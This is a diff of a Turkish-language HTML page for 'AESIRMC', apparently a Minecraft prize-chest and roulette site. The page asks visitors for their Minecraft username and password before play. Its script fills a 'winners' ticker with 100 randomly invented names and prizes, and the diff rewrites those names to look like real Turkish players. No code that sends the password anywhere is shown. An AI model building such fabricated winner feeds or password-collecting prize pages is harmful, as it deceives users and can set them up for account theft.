@@ -11,64 +11,39 @@
     
     <style>
         :root {
-            --primary: #00a2ff;
-            --secondary: #0066ff;
-            --accent: #d48e00;
-            --bg-dark: #050608;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.1);
-            --success: #00ff88;
+            --primary: #00a2ff; --secondary: #0066ff; --accent: #d48e00;
+            --bg-dark: #050608; --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1); --success: #00ff88;
         }
 
         body {
-            margin: 0;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--bg-dark);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg-dark); color: white; min-height: 100vh;
+            display: flex; flex-direction: column;
             background-image: radial-gradient(circle at 10% 20%, rgba(0, 162, 255, 0.1) 0%, transparent 40%);
             overflow-x: hidden;
         }
 
-        /* ÜST KAZANANLAR ŞERİDİ */
+        /* KAZANANLAR ŞERİDİ */
         .winners-ticker {
-            background: rgba(0, 162, 255, 0.05);
+            background: rgba(0, 162, 255, 0.08);
             border-bottom: 1px solid var(--border);
-            height: 40px;
-            display: flex;
-            align-items: center;
-            overflow: hidden;
-            white-space: nowrap;
-            position: relative;
+            height: 45px; display: flex; align-items: center;
+            overflow: hidden; white-space: nowrap;
         }
 
         .ticker-content {
-            display: inline-flex;
-            animation: ticker-move 120s linear infinite;
-            gap: 50px;
-            padding-left: 100%;
+            display: inline-flex; animation: ticker-move 100s linear infinite;
+            gap: 60px; padding-left: 100%;
         }
 
-        .winner-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
+        .winner-item { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
         .winner-name { color: #fff; }
-        .winner-prize { color: var(--success); text-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
+        .winner-prize { color: var(--success); text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
 
-        @keyframes ticker-move {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-100%); }
-        }
+        @keyframes ticker-move { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
 
-        /* DİĞER STİLLER */
-        #toast-container { position: fixed; top: 60px; right: 20px; z-index: 10000; }
+        #toast-container { position: fixed; top: 70px; right: 20px; z-index: 10000; }
         .toast {
             background: rgba(0, 255, 136, 0.1); backdrop-filter: blur(15px);
             border: 1px solid var(--success); color: white; padding: 14px 22px;
@@ -85,11 +60,9 @@
         .custom-cursor-img { width: 45px; height: 45px; object-fit: contain; }
 
         nav { padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; background: rgba(5, 6, 8, 0.85); border-bottom: 1px solid var(--border); }
-        
         #auth-container { margin: auto; width: 100%; max-width: 420px; padding: 50px; background: var(--glass); border: 1px solid var(--border); border-radius: 32px; text-align: center; }
         input { width: 100%; padding: 16px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; }
-        .btn-primary { width: 100%; padding: 18px; background: linear-gradient(135deg, var(--primary), var(--secondary)); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; text-transform: uppercase; }
-
+        
         #game-container { display: none; padding: 60px; text-align: center; }
         .main-chest { width: 220px; cursor: pointer; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); }
         .chest-jump { animation: squash-stretch 0.5s ease-in-out; }
@@ -103,7 +76,7 @@
         .slot img { width: 70px; }
 
         #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-        .win-card { background: #111; padding: 50px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; box-shadow: 0 0 50px rgba(0, 162, 255, 0.2); }
+        .win-card { background: #111; padding: 50px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; }
     </style>
 </head>
 <body>
@@ -116,7 +89,7 @@
 
 <nav>
     <div style="display: flex; align-items: center; gap: 12px;">
-        <img src="logo.png" width="40" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
+        <img src="logo.png" width="40" onerror="this.style.display='none'">
         <div style="font-size: 22px; font-weight: 800;">AESIR<span style="color:var(--primary)">MC</span></div>
     </div>
 </nav>
@@ -132,7 +105,7 @@
     <h2>Giriş Yap</h2>
     <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
     <input type="password" id="password" placeholder="Şifre">
-    <button class="btn-primary" onclick="connectAndGo()">SİSTEME BAĞLAN</button>
+    <button class="btn-primary" style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">SİSTEME BAĞLAN</button>
 </div>
 
 <div id="game-container">
@@ -144,7 +117,7 @@
 
     <div id="roulette-section">
         <div class="viewport"><div id="strip"></div></div>
-        <button class="btn-primary" id="spin-btn" style="width: 200px; margin-top: 30px;" onclick="runRoulette()">KASAYI ÇEVİR</button>
+        <button class="btn-primary" id="spin-btn" style="width: 200px; margin-top: 30px; padding:15px; background:var(--primary); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="runRoulette()">KASAYI ÇEVİR</button>
     </div>
 </div>
 
@@ -153,7 +126,7 @@
         <h2 style="color: var(--primary);">KAZANDIN!</h2>
         <h1 id="win-name" style="font-size: 40px; margin: 15px 0;"></h1>
         <img id="win-img" src="" width="150">
-        <div style="margin-top: 30px;"><button class="btn-primary" onclick="location.reload()">KAPAT</button></div>
+        <div style="margin-top: 30px;"><button class="btn-primary" style="padding:15px 40px; background:var(--primary); border:none; border-radius:12px; color:white; cursor:pointer;" onclick="location.reload()">KAPAT</button></div>
     </div>
 </div>
 
@@ -167,16 +140,20 @@
         { name: "1000AP", img: "1000.png" }, { name: "200AP", img: "200.png" }, { name: "2000AP", img: "2000.png" }
     ];
 
-    // 100 TANE RASTGELE KAZANAN OLUŞTURMA
-    const mcNames = ["HypixelLover", "MineCrafter_TR", "AesirKing", "ShadowWalker", "PixelMaster", "BlockBreaker", "Enderman99", "SkyBlocker", "PVP_God", "CraftMan", "DragonSlayer", "RedstonePro"];
+    // SADECE TÜRK İSMİ + SAYI SİSTEMİ
+    const turkIsimleri = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Boran", "Selim", "Kerem", "Yigit", "Ege", "Kaan", "Enes", "Omer", "Ali", "Batuhan", "Umut", "Deniz", "Serkan", "Gökhan", "Murat"];
     const ticker = document.getElementById('ticker');
+    
     for(let i=0; i<100; i++) {
-        const name = mcNames[Math.floor(Math.random() * mcNames.length)] + Math.floor(Math.random() * 999);
+        const isim = turkIsimleri[Math.floor(Math.random() * turkIsimleri.length)];
+        const sayi = Math.floor(Math.random() * 99); 
+        const tamIsim = isim + sayi;
         const prize = rewards[Math.floor(Math.random() * rewards.length)].name;
+        
         ticker.innerHTML += `
             <div class="winner-item">
-                <span class="winner-name">${name}</span>
-                <span style="opacity:0.5;">az önce kazandı:</span>
+                <span class="winner-name">${tamIsim}</span>
+                <span style="opacity:0.4; font-size: 11px;">kazandı:</span>
                 <span class="winner-prize">${prize}</span>
             </div>
         `;
@@ -194,7 +171,7 @@
             document.getElementById('auth-container').style.display = 'none';
             document.getElementById('game-container').style.display = 'block';
             document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
-            showToast("Başarıyla bağlanıldı!");
+            showToast("Sisteme giriş yapıldı!");
         }
     }
 
